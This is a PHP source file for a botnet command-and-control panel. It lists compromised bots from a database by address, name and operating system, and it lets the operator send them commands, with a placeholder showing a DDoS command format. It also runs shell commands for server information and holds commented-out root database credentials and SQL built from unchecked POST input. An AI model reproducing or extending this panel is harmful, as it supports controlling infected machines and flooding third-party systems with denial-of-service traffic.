<?php
  //include 'config.php';
  include 'mysql_config.php';


  //Server Information:
  $server_os = shell_exec("uname -o");
  $server_kernel = shell_exec("uname -r");
  $server_ip = $_SERVER["SERVER_ADDR"];

  $server_current_user = shell_exec("whoami");
  $server_current_path = shell_exec("pwd");
  /*
  $mysql_host = "127.0.0.1";
  $mysql_user = "root";
  $mysql_pass = "toor";
  */
  $page = (isset($_POST['page']))? $_POST['page'] : 1;

  //Mysql Configuration:
  $m_connection = mysql_connect($mysql_host, $mysql_user, $mysql_pass);
  mysql_select_db($mysql_db, $m_connection);

?>
<div id="wb_main_bot">
  <table border="1px" cellspacing="0">
  <tr>
    <th>BOTS <input type="checkbox" name="bots[]" id="checkbox_all" value="wb_BotAll" form="form_command"></th>
    <th>STATUS</th>
    <th>ADDRESS</th>
    <th>NAME</th>
    <th>OPERATION SYSTEM</th>
  </tr>
  <?php

    //Bot rows
    $bot_data = mysql_query("SELECT * FROM Bot_Data", $m_connection);
    $bot_data_linhas = mysql_num_rows($bot_data);

    $bot_data_status = mysql_query("SELECT bot_status FROM Bot_Data WHERE bot_status=1", $m_connection);
		$bot_data_status_linhas = mysql_num_rows($bot_data_status);

    //Show bots in html list:
    $max_itens_page = 30;

    $numpages = ceil($bot_data_linhas/$max_itens_page);
    $begin_page = ($max_itens_page * $page) - $max_itens_page;

    $bot_counter = ((1 + ($page * $max_itens_page)) - $max_itens_page);

    $bot_data = mysql_query("SELECT * FROM Bot_Data LIMIT $begin_page,$max_itens_page");

    while($bot_data_array = mysql_fetch_assoc($bot_data)){

      $bot_token = $bot_data_array["bot_token"];

      echo "<tr>";
      echo"<td>$bot_counter <input type='checkbox' class='checkbox_bot' name='bots[]' form='form_command' value='$bot_token' checked></td>";
      if($bot_data_array["bot_status"] == 0){
        echo "<td><img src='images/off.png'></td>";
      }elseif($bot_data_array["bot_status"] == 1){
        echo "<td><img src='images/on.png'></td>";
      }else{
        echo "<td><img src='images/no.png'></td>";
      }

      echo "<td>".$bot_data_array["bot_address"]."</td>";
      echo "<td>".$bot_data_array["bot_name"]."</td>";
      echo "<td>".$bot_data_array["bot_osystem"]."</td>";
      echo "</tr>";

      $bot_counter++;
    }
  ?>
  </table>
  <script type="text/javascript">
    //uncheck
    $('.checkbox_bot').prop('checked', false);
  </script>
</div>
<?php

  //Call json.php fucntions:
  include 'json.php';

  function Scommand_json_command(){
    if(isset($_POST["cb_command"]) and isset($_POST["bots"])){
      $command = $_POST["cb_command"];
      $bots = $_POST["bots"];

      Spend_command("command", $command, $bots);

    }else{

      return false;
    }

  }

?>
<div id="wb_bots">
  <form id="form_page" method="post" action="">
    Pages <?php echo '<input type="number" id="input_pages" name="page" value="1" min="1" max="'.$numpages.'" step="1"> ';?> <input type="submit" value="Go">
  </form>
  <form id="form_command" method="post" onsubmit="<?php Scommand_json_command() ?>">
    Command <input type="text" id="input_command" name="cb_command" placeholder='Ex Command_Bot.Ddos{"address", port, threads, packages}'> <input type="submit" value="Send Command">
  </form>
</div>

<?php
  mysql_close($m_connection);
?>
